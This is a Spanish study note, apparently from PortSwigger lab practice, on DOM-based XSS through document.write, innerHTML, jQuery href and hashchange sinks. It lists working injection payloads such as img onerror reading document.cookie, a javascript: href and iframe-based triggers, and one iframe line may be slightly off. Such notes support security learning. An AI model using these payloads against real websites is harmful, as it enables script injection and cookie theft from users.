# DOM XSS

Tags: #XSS #PortSwigger #JavaScript #DOM 

* [DOM - Introduccion](https://lenguajejs.com/dom/introduccion/que-es/)

```bash 
# Para este tipo de ataque, se debe de buscar la manera de poder inyectar codigo JavaScript

1. Mirar el codigo fuente en donde se esta colocando texto, puede ser en 'img src=" ">'
2. Ver la manera de poder cerrar alguna comilla para poder inyectar codigo JavaScript

Notas:
	1. En un DOM XSS, el HTML con la inyección no viene del servidor. Si no que se construye y se ejecuta en nuestro navegador a traves de JavaScript 
```

## DOM XSS  con 'document.write' y 'location.search'

```javascript 
// Se debe cerrar la doble comilla y la etiqueta del código para poder ejecutar JavaScript y acontecer el XSS

	"> <svg/onload=alert(1)>
	"> <img src/onerror=alert(document.domain)>
```

## DOM XSS con 'innerHTML' y 'location.search'

```javascript 
// InnerHTML permite alterar uno o varios elementos del DOM sin afectar el resto de la página

	<img src="test.png">        // Cargar una imagen 
	<img src=0 onerror=alert(document.cookie)>    // Usar el error para cargar código JavaScript
```

## DOM XSS en 'href' con JQuery y 'location.search'  

```javascript 
// Se puede buscar los siguientes elementos cuando se tiene "JQuery library's $ selector function"
	$('a') -> <a>
	$('#id') -> id="id"
	$('.clase') -> class="clase"


// En 'href' se puede hacer que en lugar de que vaya a la url, esta ejecute una instrucción
	javascript:alert(document.cookie)
```

## DOM XSS con JQuery y evento 'hashchange'

```javascript 
// El selector de JQuery te crea temporalmente un elemento, esto funciona en la url del navegador 

	#<img src=0 onerror=alert(0)> 

// Se debe forzar un cambio a la solicitud, ya que de primera si funciona pero despues ya no ya que como cvarga el mismo contenido, la función no 'funciona' 
	#<img src=0 onerror=print()> 

// Utilizar el server que comparte el lab, utilizar 'iframe html' y forzar el cambio 
	<iframe src="http://web.com/#"></iframe>       // Forma original 

// Forma concatenada para cargar otro contenido y forzar el cambio 
	<iframe src="http://web.com/#" onload="this.source += '<img src=0 onerror=alert(0)>' "></iframe> 
	<iframe src="http://web.com/#" onload="this.source += '<img src=0 onerror=print()>' "></iframe>
```